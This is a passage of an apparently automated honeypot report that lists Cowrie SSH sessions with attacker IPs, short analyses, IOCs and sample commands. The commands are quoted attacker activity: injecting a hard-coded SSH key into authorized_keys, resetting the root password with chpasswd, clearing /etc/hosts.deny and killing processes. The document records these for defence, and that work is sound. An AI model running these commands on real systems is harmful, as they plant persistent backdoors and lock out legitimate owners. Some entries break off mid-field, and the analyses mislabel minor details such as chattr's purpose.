**Brief Summary:** The attacker injected an SSH key into the target’s authorized keys and attempted to change the system password, establishing a persistent remote shell access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1\nIUj0WFB3KxZE\nIUj0WFB3KxZE"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1\nIUj0WFB3KxZE\nIUj0WFB3KxZE\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 03a2cd3e4072...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.103.145.231

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged (root) access to the system for future exploitation.  

**Techniques Used:**  
- **SSH Key Injection** – created an `authorized_keys` file with a hard‑coded RSA key.  
- **Root Password Reset** – changed root password via `chpasswd`.  
- **Process/Script Removal & Killing** – deleted temporary scripts and killed processes (`secure.sh`, `auth.sh`, `sleep`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **14.103.145.231**  
- RSA key string in `.ssh/authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`)  
- Root password hash (`6PK43MSNKU4q`).  

**Threat Level:** **High** – attacker achieved full system control with a persistent backdoor.  

**Brief Summary:** The attacker injected an SSH key and reset the root password, establishing a permanent backdoor for remote access to the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:6PK43MSNKU4q"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 915f36be8d4f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 1.214.197.163

#### Analysis

**Attack Type:** Backdoor installation / remote access exploitation  
**Objective:** Gain persistent administrative control on the target machine by installing an SSH key and resetting the root password.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to hide/disable file attributes.  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA public key.  
- `chpasswd` to set the root password (`root:tSW9InUtqW...`).  
- Process termination (`pkill -9`) and emptying `/etc/hosts.deny`.  
- System reconnaissance (CPU, memory, disk usage).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **1.214.197.163** (South Korea)  
- RSA public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password hash: `root:tSW9InUtqW...`  

**Threat Level:** **High** – the attacker has established a persistent backdoor with administrative privileges, enabling future exploitation.  

**Brief Summary:** The attacker installed an SSH key and reset the root password to create a permanent remote access backdoor on the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:tSW9InUtqQWV"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 95a7fb84d271...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 203.195.83.85

#### Analysis

**Attack Type:**  
Backdoor installation with reconnaissance (SSH key injection + system‑info gathering)

**Objective:**  
Create a persistent remote access point via an injected SSH key while collecting system details to assess the target’s environment.

**Techniques & Tools:**
- `chattr -ia .ssh` / `lockr -ia .ssh` – attempt to lock/attribute the `.ssh` directory.
- `mkdir .ssh && echo <SSH‑key> > .ssh/authorized_keys` – inject a public key into authorized_keys.
- `chmod -R go= ~/.ssh` – restrict permissions on the SSH folder.
- `passwd` piped via `echo` – attempt to change or set a new UNIX password (likely for user creation).
- System‑info commands: `cat /proc/cpuinfo`, `free -m`, `ls`, `crontab -l`, `w`, `uname`, `lscpu`, `df -h` – gather CPU, memory, disk, cron jobs, uptime, etc.

**Indicators of Compromise (IOCs):**
- Attacker IP: **203.195.83.85**  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File created: `.ssh/authorized_keys` (with the key)

**Threat Level:** Medium – attacker demonstrates moderate sophistication by injecting a backdoor and gathering system data, but no payload download or exploitation of vulnerabilities.

**Brief Summary:**  
The attacker injected an SSH public key into the target’s authorized_keys to establish remote access while collecting detailed system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\nYMSwphDOvEUy\nYMSwphDOvEUy"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\nYMSwphDOvEUy\nYMSwphDOvEUy\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 90bd2119e403...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 125.21.53.232

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise – the attacker attempts to gain persistent root access on the honeypot.

**2. Objective:**  
Install an unauthorized SSH key and change the root password so that the attacker can remotely log in as root, thereby enabling further exploitation or persistence.

**3. Techniques & Tools Used:**
- `chattr`/`lockr` to set immutable attributes on `.ssh`.
- Removal and recreation of `.ssh` directory.
- Injection of a malicious RSA public key into `authorized_keys`.
- `chmod -R go= ~/.ssh` to restrict permissions.
- `echo "root:wYPovdwD0yD9"|chpasswd|bash` to change root password.
- Process killing (`pkill -9`) and host denial file creation to hide activity.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **125.21.53.232**  
- RSA public key string (hashable if needed).  
- File paths manipulated: `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.  
- Commands that modify system files and permissions.

**5. Threat Level:** **High** – the attacker gains root access, installs a backdoor, and attempts to conceal its actions, indicating a sophisticated threat.

**6. Brief Summary:**  
The attacker executed a series of commands to overwrite the SSH configuration, inject a malicious key, change the root password, and hide their activity, effectively establishing a persistent backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:wYPovdwD0yD9"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: a7f5fa677d95...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.31.187.1

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain remote SSH access to the target system by adding a malicious public key to `~/.ssh/authorized_keys`.  
**Techniques:**  
- Use of `chattr` and `lockr` to set immutable attributes on `.ssh` directory, attempting to hide or protect the file.  
- Creation of a new `.ssh` directory and insertion of a hard‑coded SSH public key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- Permission manipulation with `chmod -R go= ~/.ssh`.  
- System reconnaissance commands (cpuinfo, free, ls, crontab, w, uname, top, whoami, lscpu, df) to gather host details.  

**Indicators of Compromise (IOCs):**  
- IP: **34.31.187.1**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Commands: `chattr -ia .ssh`, `lockr -ia .ssh`.  

**Threat Level:** Medium – the attacker is attempting to establish a persistent remote access point, but no evidence of payload download or cryptomining.  

**Brief Summary:** The attacker injected a malicious SSH public key into the honeypot’s authorized_keys directory and performed system reconnaissance, indicating an attempt to create a backdoor for future remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\ns34rdqa8gK0k\ns34rdqa8gK0k"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\ns34rdqa8gK0k\ns34rdqa8gK0k\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 2edd33d1845f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.31.187.1

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged (root) access to the system via SSH and direct shell.  

**Techniques Used:**  
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` with a hard‑coded RSA key.  
- **Root Password Reset** – `chpasswd` to set root password (`vQMP7yGbu772`).  
- **Process & File Cleanup** – `rm -rf /tmp/...`, `pkill -9 ...`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 34.31.187.1  
- SSH public key string (the long RSA key in command 3).  
- Path `.ssh/authorized_keys` on the honeypot.  

**Threat Level:** **High** – attacker obtains full system control, enabling further exploitation or data exfiltration.  

**Summary:** The session shows an attacker installing a backdoor by injecting an SSH key and resetting the root password, thereby granting remote privileged access to the target machine.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:vQMP7yGbu772"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 31beabdc8e7b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 125.21.53.232

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain remote access through SSH and collect system information for further exploitation.  
**Techniques:**  
- `chattr -ia .ssh` & `lockr -ia .ssh` to hide the `.ssh` directory.  
- Creation of a new SSH key in `authorized_keys`.  
- Password attempts (`passwd`).  
- System‑info commands (CPU, memory, disk, uname, crontab).  

**Indicators of Compromise (IOCs):**  
- The SSH key string: `AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\nljnNrC4jlMtV\nljnNrC4jlMtV"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\nljnNrC4jlMtV\nljnNrC4jlMtV\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 7dd5e307d332...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 70.54.182.130

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection with subsequent reconnaissance  
**Objective:** Gain persistent remote access (SSH) and collect system information for future exploitation or profiling.  
**Techniques:**  
- Creation/overwrite of `~/.ssh` directory, insertion of a public RSA key into `authorized_keys`.  
- Use of `chattr -ia` and `lockr -ia` to make the SSH directory immutable.  
- System‑info commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, `whoami`, etc.) for reconnaissance.  
**Indicators of Compromise (IOCs):**  
- Public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...`  
- File path: `~/.ssh/authorized_keys`  
- Commands: `chattr -ia .ssh`, `lockr -ia .ssh`.  
**Threat Level:** Medium – the attacker has established a backdoor and gathered system details, indicating potential malicious intent.  
**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized keys, made it immutable, and performed extensive system reconnaissance to prepare for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\nqFXRrUFBF6kV\nqFXRrUFBF6kV"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\nqFXRrUFBF6kV\nqFXRrUFBF6kV\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 224379503207...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 187.110.238.50

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote SSH access (potentially root privileges) and collect system information.  
**Techniques:**  
- Created/modified `.ssh` directory and injected a public SSH key into `authorized_keys`.  
- Attempted to change the root password (`chpasswd`).  
- Killed suspicious processes (`secure.sh`, `auth.sh`, `sleep`) and altered `/etc/hosts.deny`.  
- Executed various system‑info commands (CPU, memory, disk usage, uname, top).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **187.110.238.50** (Brazil)  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
-

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:2LdQnISkm8bD"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: ae08a07a292f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 154.92.14.191

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain remote SSH access and gather system information for further exploitation  
**Techniques:**  
- Creation of `.ssh` directory, setting immutable attributes (`chattr -ia`, `lockr -ia`) to hide modifications  
- Injection of a public‑key into `authorized_keys` with restrictive permissions (`chmod go= ~/.ssh`)  
- Attempts to change the local user password using `passwd` (likely to lock out existing accounts)  
- System‑info commands: CPU, memory, filesystem, crontab, uptime, uname, whoami, etc.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **154.92.14.191** (Hong Kong)  
- Public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Password attempts: `student6`, `PWFUN7akSsU2`  

**Threat Level:** Medium – moderate sophistication, potential for remote exploitation.  

**Summary:** The attacker injected an SSH key to establish a backdoor and performed system reconnaissance to prepare for further attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "student6\nPWFUN7akSsU2\nPWFUN7akSsU2"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "student6\nPWFUN7akSsU2\nPWFUN7akSsU2\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 09209a7304d9...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 41.58.186.130

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain privileged access (root) via SSH key injection and password reset.  

**Techniques Used:**  
- File attribute manipulation (`chattr`, `lockr`) to hide `.ssh`.  
- Removal & recreation of `.ssh` directory, injection of a hard‑coded RSA public key into `authorized_keys`.  
- Password change via `chpasswd`.  
- Process termination (`pkill -9`) and host denial file creation.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **41.58.186.130** (Nigeria).  
- Injected RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  

**Threat Level:** **High** – the attacker successfully installed a persistent backdoor and altered root credentials, enabling full system control.  

**Brief Summary:** The session shows an attacker injecting a hard‑coded SSH key into the honeypot’s `.ssh` directory and resetting the root password, effectively establishing a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:IwqEL8h96KIt"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c24d22d32dec...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.172.205.208

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection (remote access).

**2. Objective:**  
Gain unauthorized remote login capability on the honeypot, while collecting system information for reconnaissance.

**3. Techniques & Tools Used:**
- `chattr -ia .ssh` and `lockr -ia .ssh` – attempt to hide or lock the `.ssh` directory.
- Creation of a random RSA key in `authorized_keys`.
- Setting file permissions (`chmod -R go= ~/.ssh`) to restrict access.
- Use of `passwd` to change user password (though ineffective).
- System‑info commands: `cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `w`, `uname`, `top`, `whoami`, `lscpu`, `df`.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **103.172.205.208**  
- Random RSA key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- File paths: `~/.ssh/authorized_keys`, `.ssh` directory.

**5. Threat Level:** **High** – sophisticated backdoor setup with system reconnaissance, potential for persistent remote access.

**6. Brief Summary:**  
The attacker injected a random SSH key into the honeypot’s authorized‑keys file and attempted to hide the `.ssh` directory while gathering extensive system information, aiming to establish a covert remote login capability.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nGB8zVdXfTCBm\nGB8zVdXfTCBm"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nGB8zVdXfTCBm\nGB8zVdXfTCBm\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 8ee5a3898039...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 196.28.242.198

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain remote SSH access to the host by inserting a valid public‑key into `~/.ssh/authorized_keys` and attempting to set a new user password.  

**Techniques & Tools Used:**
- `chattr -ia`, `lockr -ia` – lock file attributes to prevent tampering  
- `chmod -R go= ~/.ssh` – restrict permissions on the SSH directory  
- `echo … > .ssh/authorized_keys` – inject a hard‑coded RSA public key  
- `passwd` piped with echo – attempt to change user password (likely for privilege escalation)

**Indicators of Compromise (IOCs):**
- Attacker IP: **196.28.242.198**  
- Public key string in the authorized_keys file  
- File path: `~/.ssh/authorized_keys`

**Threat Level:** **High** – successful SSH key injection allows persistent remote control and potential lateral movement.

**Brief Summary:** The attacker injected a valid SSH public key into the honeypot’s `.ssh` directory, attempted to modify user credentials, and gathered system information, indicating an intent to establish a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "secret\nr2VRIXn3BvLK\nr2VRIXn3BvLK"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "secret\nr2VRIXn3BvLK\nr2VRIXn3BvLK\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 27fcc404d059...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.217.205

#### Analysis

**Attack Type:**  
Backdoor installation + reconnaissance (remote SSH access with root privileges)

**Objective:**  
Gain persistent remote control of the host by installing an SSH key and resetting the root password, while gathering detailed system information for further exploitation.

**Techniques & Tools Used:**
- **SSH key injection** – creation of a new `.ssh/authorized_keys` file containing a custom RSA key.
- **Root password reset** – `chpasswd` command to set root password (`0y5DIAo1q

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:0y5DIAo1qM7R"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+9 more)
```

---

### Pattern: c9493ebfafb1...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.231.14.54

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain privileged (root) access on the honeypot by installing an SSH key and changing the root password.  

**Techniques & Tools Used:**
- `chattr -ia` & `lockr -ia` – likely custom tools to lock files/attributes.  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA public key.  
- `chpasswd` to set root password (`root:MdKEjmdCh7DF`).  
- Removal and killing of temporary scripts (`secure.sh`, `auth.sh`) and processes (`sleep`).  

**Indicators of Compromise (IOCs):**
- Attacker IP: **103.231.14.54** (Hong Kong).  
